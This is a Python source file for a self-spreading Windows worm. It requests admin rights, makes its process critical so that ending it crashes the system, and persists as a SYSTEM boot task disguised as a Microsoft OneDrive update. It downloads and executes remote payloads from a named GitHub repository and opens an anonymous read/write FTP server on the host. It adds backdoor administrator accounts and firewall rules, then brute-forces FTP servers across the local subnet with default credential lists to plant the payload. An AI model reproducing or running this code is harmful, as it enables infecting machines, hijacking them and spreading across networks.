import os
import random
import string
import psutil, shutil
import subprocess
import socket
import sys
import requests
import urllib3
import ftplib
import ctypes
import getpass
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

common_users = ['test','anonymous','abc123','nic2212','PlcmSpIp','accounting','123456','nmt','se','supervisor','Root','MayGion','USER','admin','manager','mysql','password','user','uploader','support','beijer','fdrusers','qwerty','john',getpass.getuser(),'nobody','administrator','default','instrument','device','httpadmin','none','ftpuser','pr','post','Guest','marketing','mail','hr','User','IEIeMerge','sysdiag','webserver','localadmin','ftp','QNUDECPU','qbf77101','webmaster','apc','ADMIN','dmftp','sa','Admin','postmaster','dm','oracle','111111','adtec','a','root','user1','loader','su','MELSEC','ntpupdate','ftp_boot','pcfactory','sales','www-data','wsupgrade','avery'
]
common_pass = ['','123456','USER','admin','Janitza','eqidemo','spam','anonymous','supervisor','factorycast@schneider','user00','password','12hrs37','aaaa','AAAA','123456789','1111','beijer','maygion.com','webadmin','b1uRR3','test2','webmaster','eMerge','pass1','test','test123','nobody','test1','root','news','info','ftp','ntpupdate','webpages','sresurdf','uploader','pcfactory','ZYPCOM','apc','admin12345','mysql','system','none','1111','ftp_boot','MELSEC','guest','nas','hexakisoctahedron','techsupport','localadmin','default','wsupgrade','stingray','dpstelecom','fwdownload','abc123','web','testingpw','ko2003wa','oracle','cvsadm','1234','testing','test4','wago','test3','tester','12345','avery','instrument','user','testuser','fhttpadmin','QNUDECPU','9999','rootpasswd','PlcmSpIp','poiuypoiuy','sysadm'
]

RtlSetProcessIsCritical = ctypes.windll.ntdll.RtlSetProcessIsCritical
RtlSetProcessIsCritical.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_uint]
RtlSetProcessIsCritical.restype = ctypes.c_int

GITHUB_URL = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/init.exe"
SECOND_URL = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/pwndrive.exe"
PAYLOAD_PATH = None

def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()

def request_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        sys.exit(0)

def set_process_as_critical():
    try:
        result = RtlSetProcessIsCritical(1, 0, 0)

        if result == 0: print("Process is now critical.")
        else: print("Failed to set the process as critical.")
    
    except:
        # print(f"Error: {e}")
        pass

def generate_random_name(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def download_payload():
    global PAYLOAD_PATH
    try:
        random_name = f'{generate_random_name()}.exe'
        destination_path = os.path.join(os.getenv('TEMP'), random_name)
        response = requests.get(GITHUB_URL)
        if response.status_code == 200:
            with open(destination_path, 'wb') as f:
                f.write(response.content)
            PAYLOAD_PATH = destination_path
        return destination_path
    except:
        return None
    
def make_open():
    try:
        random_name = f'{generate_random_name()}.exe'
        download_path = os.path.join(os.getenv('TEMP'), random_name)
        response = requests.get(SECOND_URL)
        if response.status_code == 200:
            open(download_path, 'wb').write(response.content)
            subprocess.Popen(download_path, shell=True)
    except:pass

def ftp_connect(ip, user, pwd, p, anonymous=False):
    global PAYLOAD_PATH
    try:
        ftp = ftplib.FTP(timeout=2)
        ftp.connect(ip, port=p)
        if anonymous: ftp.login()
        else: ftp.login(user, pwd)
        random_name = f'{generate_random_name()}.exe'
        if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
        else: payload_path = download_payload()
        if payload_path:
            with open(payload_path, 'rb') as f:
                response = ftp.storbinary(f'STOR {random_name}', f)
                if not response.startswith("226"): return False
        else: return False
        ftp.quit()
        return True
    except: return False

# FTP propagation to subnet servers
def ftp_spread(common_users, common_pass):
    try:
        credentials = [(user, pwd) for user in common_users for pwd in common_pass]
        local_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0]
        def try_ip(ip):
            ports = [21]
            ports.extend([2222,2021])
            ports.extend(list(range(2121,2131)))
            for port in ports:
                try:
                    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    soc.settimeout(2)
                    soc.connect((ip, port))
                    soc.close()
                    if not ftp_connect(ip, "", "", port, anonymous=True):
                        done = False
                        for user, pwd in credentials:
                            done = ftp_connect(ip, user, pwd, port)
                            if done: break 
                except: continue
        with ThreadPoolExecutor(max_workers=10) as executor:
            ip_list = [f'{local_ip}.{i}' for i in range(1, 255)]
            executor.map(try_ip, ip_list)
    except:
        pass

# Hide process by mimicking runtimebroker.exe
def hide_process():
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == 'runtimebroker.exe':
                os.environ['COMSPEC'] = proc.exe()
                break
    except:
        pass

# Persistence via schtasks
def persist_schtasks():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        appdata_path = os.path.join(os.getenv('APPDATA'), 'TrustedInstaller.exe') # this will be the PE file name
        if exe_path != appdata_path:
            shutil.copy2(exe_path, appdata_path)
        exe_path = f'"{os.path.normpath(appdata_path)}"'
        task_name = "OneDrive Standalone Update Task-S-1-5-18-18645234277racer1845-3677ree32sas42s428255-3946825334aexce4w29952-1001"
        xml = rf"""
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
        <Author>Microsoft Corporation</Author>
        <Description>OneDrive Standalone Update Handler</Description>
        <URI>\Microsoft\Windows\Defender\HealthMonitor</URI>
        <Date>2024-01-01T00:00:00</Date>
    </RegistrationInfo>
    <Principals>
        <Principal id="Author">
            <UserId>NT AUTHORITY\SYSTEM</UserId>
            <RunLevel>HighestAvailable</RunLevel>
        </Principal>
    </Principals>
    <Triggers>
        <BootTrigger>
            <Enabled>true</Enabled>
            <Delay>PT30S</Delay>
        </BootTrigger>
    </Triggers>
    <Settings>
        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> 
    </Settings>
    <Actions Context="Author">
        <Exec>
            <Command>{exe_path}</Command>
        </Exec>
    </Actions>
</Task>
"""
        xml_path = os.path.join(os.getenv('TEMP'), 'pp.xml')
        open(xml_path, 'w', encoding='utf-16').write(xml.strip())
        cmd = f'schtasks /create /tn "{task_name}" /xml "{xml_path}" /f'
        subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=0x08000000)
        os.system(f'powershell remove-item -path "{xml_path}" -force -erroraction silentlycontinue')
    except:
        pass

# Enable and configure Windows IIS FTP server
def setup_ftp_server(usernames, passwords):
    try:
        # Check if FTP server is enabled
        result = subprocess.run(
            ['dism.exe', '/online', '/get-featureinfo', '/featurename:IIS-FTPServer'],
            capture_output=True, text=True, creationflags=0x08000000
        )
        if 'State : Enabled' not in result.stdout:
            # Enable IIS FTP Server feature
            result = subprocess.run(
                'dism /online /enable-feature /featurename:IIS-FTPServer /all && dism /online /enable-feature /featurename:IIS-FTPExtensibility',
                shell=True, capture_output=True, text=True, creationflags=0x08000000
            )
            if result.returncode == 0: print(f"IIS FTP Server feature enabled successfully: {result.stdout}")
            else:  
                print(f"Error enabling IIS FTP Server feature: {result.stderr}")
                return

        # Start FTP service
        subprocess.run(
            'net start ftpsvc',
            shell=True, capture_output=True, creationflags=0x08000000
        )

        # Create obscure FTP root directory
        ftp_root = r'C:\inetpub\ftproot'
        if not os.path.exists(ftp_root):
            os.makedirs(ftp_root)

        # Configure FTP site using appcmd with port fallback
        site_name = 'DefaltSite'
        appcmd = r'C:\Windows\System32\inetsrv\appcmd.exe'
        ports = [21]
        ports.extend(list(range(2121,2200)))
        result = subprocess.run(
            ['C:\\Windows\\System32\\netstat.exe', '-a', '-n', '-p', 'TCP'],
            capture_output=True, text=True, creationflags=0x08000000
        )
        selected_port = None
        for port in ports:
            if f':{port}' not in result.stdout:
                try:
                    result = subprocess.run(
                        [appcmd, 'add', 'site', f'/name:{site_name}', f'/bindings:ftp://*:{port}', f'/physicalPath:{ftp_root}'],
                        shell=True, capture_output=True, creationflags=0x08000000
                    )
                    if result.returncode == 0: 
                        selected_port = port
                        break
                except:
                    continue
        if not selected_port:
            return
        print(f"Selected port: {selected_port}")
        # Enable anonymous and basic authentication
        subprocess.run(
            [appcmd, 'set', 'config', '-section:system.applicationHost/sites', f"/[name='{site_name}'].ftpServer.security.authentication.anonymousAuthentication.enabled:True", '/commit:apphost'],
            shell=True, capture_output=True, creationflags=0x08000000
        )
        subprocess.run(
            [appcmd, 'set', 'config', '-section:system.applicationHost/sites', f"/[name='{site_name}'].ftpServer.security.authentication.basicAuthentication.enabled:True", '/commit:apphost'],
            shell=True, capture_output=True, creationflags=0x08000000
        )

        # clear existing authorization rules
        subprocess.run(
            [appcmd, 'set', 'config', site_name, '-section:system.ftpServer/security/authorization', "/-[users='*']", '/commit:apphost'],
            shell=True, capture_output=True, text=True, creationflags=0x08000000
        )

        subprocess.run(
            [appcmd, 'set', 'config', site_name, '-section:system.ftpServer/security/authorization', "/-[roles='*']", '/commit:apphost'],
            shell=True, capture_output=True, text=True, creationflags=0x08000000
        )

        # Set authorization rules
        subprocess.run(
            [appcmd, 'set', 'config', site_name, '-section:system.ftpServer/security/authorization', "/+[accessType='Allow',users='*',permissions='Read,Write']", '/commit:apphost'],
            shell=True, capture_output=True, creationflags=0x08000000
        )
        subprocess.run(
            [appcmd, 'set', 'config', site_name, '-section:system.ftpServer/security/authorization', "/+[accessType='Allow',users='anonymous',permissions='Read,Write']", '/commit:apphost'],
            shell=True, capture_output=True, creationflags=0x08000000
        )

        subprocess.run(
            [appcmd, 'set', 'config', site_name, '-section:system.ftpServer/security/authorization', "/+[accessType='Allow',roles='Administrator, Guest',users='*',permissions='Read,Write']", '/commit:apphost'],
            shell=True, capture_output=True, text=True, creationflags=0x08000000
        )

        # Set SSL
        subprocess.run(
            [appcmd, 'set', 'config', '-section:system.applicationHost/sites', f"/[name='{site_name}'].ftpServer.security.ssl.controlChannelPolicy:SslAllow", '/commit:apphost'],
            shell=True, capture_output=True, text=True, creationflags=0x08000000
        )
        subprocess.run(
            [appcmd, 'set', 'config', '-section:system.applicationHost/sites', f"/[name='{site_name}'].ftpServer.security.ssl.dataChannelPolicy:SslAllow", '/commit:apphost'],
            shell=True, capture_output=True, text=True, creationflags=0x08000000
        )

        random_pairs = random.sample(list(zip(usernames, passwords)), 3)
        common_users = [('ftp', 'ftp'), ('admin', 'password'), ('anonymous', '')] + random_pairs
        common_users = list(set(common_users))

        # Add FTP users and grant access
        for username, password in common_users:
            print(f"Creating user: {username}")
            subprocess.run(
                ['net.exe', 'user', username, password, '/add'],
                shell=True, capture_output=True, creationflags=0x08000000
            )
            subprocess.run(
                ['net.exe', 'localgroup', 'Administrators', username, '/add'],
                shell=True, capture_output=True, creationflags=0x08000000
            )
            subprocess.run(
                ['icacls.exe', ftp_root, '/grant', f'{username}:(R,W)'],
                shell=True, capture_output=True, creationflags=0x08000000
            )

        # Add firewall rule for selected port
        subprocess.run(
            f'netsh advfirewall firewall add rule name="Allow_FTP_{selected_port}" dir=in action=allow protocol=TCP localport={selected_port} profile=any enable=yes', # firewall usually enables it by default, still just in case
            shell=True, capture_output=True, creationflags=0x08000000
        )

        subprocess.run(
            f'netsh advfirewall firewall add rule name="Allow_FTP_Passive" dir=in action=allow protocol=TCP localport=1024-65535 profile=any enable=yes',
            shell=True, capture_output=True, creationflags=0x08000000
        )

        subprocess.run(
            f'netsh advfirewall firewall add rule name="Allow_ICMP" protocol=ICMPv4 dir=in action=allow enable=yes profile=any',
            shell=True, capture_output=True, creationflags=0x08000000
        )

        subprocess.run(
            ['icacls.exe', ftp_root, '/grant', 'IUSR:(OI)(CI)(R,W)'], shell=True, capture_output=True, creationflags=0x08000000
        )

        subprocess.run(
            f'icacls.exe {ftp_root} /grant "IIS_IUSRS:(OI)(CI)(R,W)"', shell=True, capture_output=True, creationflags=0x08000000
        )

        # Upload payload to local FTP server
        payload_path = PAYLOAD_PATH if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH) else download_payload()
        if payload_path and os.path.exists(payload_path):
            random_name = f'{generate_random_name()}.exe'
            destination = os.path.join(ftp_root, random_name)
            shutil.copy2(payload_path, destination)
    except:
        pass

if __name__ == "__main__":
    request_admin()
    set_process_as_critical()
    persist_schtasks()
    download_payload()
    setup_ftp_server(common_users, common_pass)
    make_open()
    hide_process()
    ftp_spread(common_users, common_pass)